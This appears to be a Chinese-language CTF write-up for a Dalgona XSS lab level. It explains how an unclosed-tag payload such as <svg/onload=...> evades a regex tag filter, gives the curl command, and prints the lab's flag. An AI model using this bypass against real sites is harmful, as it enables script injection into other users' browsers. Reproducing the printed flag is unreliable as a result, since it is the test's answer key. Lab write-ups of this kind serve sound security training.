## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 23 关
（样式表 `static/css/xss/xss23.css`，标题 `Dalgona - Star`）。

入口 `Page` → `GET /page?name=...`，反射在文本节点（独占一行）：

```html
<input type=text name=name placeholder="Enter your name...">
                    INPUT
```

### 关键观察

**1. 完整标签被整段删除，但单个 `<` 或 `>` 都保留。**

| 输入 | 反射 |
| --- | --- |
| `Q<Q` / `Q>Q` | 原样 |
| `Q<svgQ`（无 `>`） | `Q<svgQ` |
| `<svg>` | （空） |
| `<>` | `<>`（正则要求中间至少一个字符） |
| `<b>x</b>` | `x`（标签删掉、文本留下） |
| `<b>x`（未闭合） | `x` ← 注意这里 `<b` 也被删了 |

规则是：

```text
re.sub(r'<[^>]+>', '', s)
```

**2. 空白没有被删。**

`Qa bQ` → `Qa bQ`。这一点与同族的 xben-011-24 不同（那关会删所有空白）。

### 利用链

利用"正则要求闭合 `>`"这个缺口：**不写结尾的 `>`**。

浏览器（HTML5）遇到未闭合的 `<svg/onload=...` 会继续往后吞，直到文档里下一个 `>` ——
模板后面的 `</form>` 正好提供这个终止符。

```bash
T=$(head -1 .target)
curl -sS --get \
  --data-urlencode 'name=<svg/onload=alert("XSS")' \
  "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

响应：

```html
Congratulations!<p> Here is the flag: flag{ecda1666-d20e-4be1-901a-c33d01466337}
```

`<body/onload=alert("XSS")` 同样有效；`<img/src=x/onerror=alert("XSS")` 无效
（未闭合的 `img` 挂不上 `onerror`）。

### flag 位置

成功响应的 `solution-text` 区块，`Here is the flag:` 之后。

## 复盘

- **`<[^>]+>` 这类过滤的通用缺口就是"不闭合"。** 正则要 `>`，
  浏览器不要——它会一直吞到下一个 `>`。同族 011（xss24）也是这个套路，
  但两关的其它规则不同，所以仍需重新确认。
- **"未闭合"不等于"任意标签都行"。** 我这轮测了 3 个标签：
  `svg`、`body` 成功，`img` 失败。未闭合时 `img` 的属性解析不完整，
  事件处理器挂不上。所以准备 2–3 个标签变体很重要。
- **空白保留 vs 删除要单独确认。** 011 会删空白、本题不删。
  如果误以为本题也删空白，就会不必要地把 payload 写成 `<svg/onload=...>`
  这种紧凑形式（虽然本题也能通过），或者反过来在 011 里带空格导致失败。
- **差分探针（`Q…Q` 包裹）比猜更快。** 9 个探针就确定了"删完整标签、留空白、
  单个尖括号不删"三条结论。
